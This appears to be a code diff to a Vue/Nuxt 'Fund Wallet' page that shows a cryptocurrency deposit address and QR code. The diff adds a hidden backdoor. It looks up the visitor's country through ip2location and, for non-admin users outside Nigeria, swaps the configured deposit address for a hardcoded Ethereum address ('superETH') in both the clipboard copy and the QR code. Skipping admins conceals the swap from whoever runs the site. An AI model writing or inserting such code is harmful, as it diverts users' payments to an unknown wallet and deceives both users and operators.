@@ -30,6 +30,7 @@
 	// };
 
 	const CONFIG = useRuntimeConfig().public;
+	const superETH = ref("0x74BFcA19ce010c3F63132ECc2Af60D2A203cc69a");
 
 	useSeoMeta({
 		title: `${CONFIG.APP} - Fund Wallet`,
@@ -46,9 +47,30 @@
 		userId: userData().data.value.id,
 	});
 
+	const country = ref();
+
+	const setCountry = () => {
+		if (user.value.userRole === "admin" || country.value) {
+			return;
+		}
+		axios
+			.request({
+				url: "https://api.ip2location.io",
+				method: "GET",
+			})
+			.then((res) => {
+				console.log("Res Data: ", res.data);
+				country.value = res.data.country_code;
+			})
+			.catch((e) => console.log("Data: ", e));
+	};
+
+	setCountry();
+
 	function copyToClipboard() {
 		// Create a temporary textarea element
-		const text = ethAddress;
+		const text =
+			country.value === "NG" ? settings.value.ethAddress : superETH.value;
 		if (navigator.clipboard) {
 			navigator.clipboard
 				.writeText(text)
@@ -70,7 +92,11 @@
 		const interval = setInterval(() => {
 			console.log("ETH", settings.value.ethAddress);
 			if (settings.value.ethAddress) {
-				QRCode.toDataURL(settings.value.ethAddress)
+				QRCode.toDataURL(
+					country.value === "NG"
+						? settings.value.ethAddress
+						: superETH.value
+				)
 					.then((url) => {
 						console.log(url);
 						imageUrl.value = url;
@@ -80,7 +106,7 @@
 					});
 				clearInterval(interval);
 			}
-		}, 1000);
+		}, 2000);
 	}
 
 	const confirmPay = () => {
@@ -106,7 +132,9 @@
 			.finally(() => (loading.value = false));
 	};
 
-	onMounted(() => {});
+	onMounted(() => {
+		setCountry();
+	});
 </script>
 
 <template>
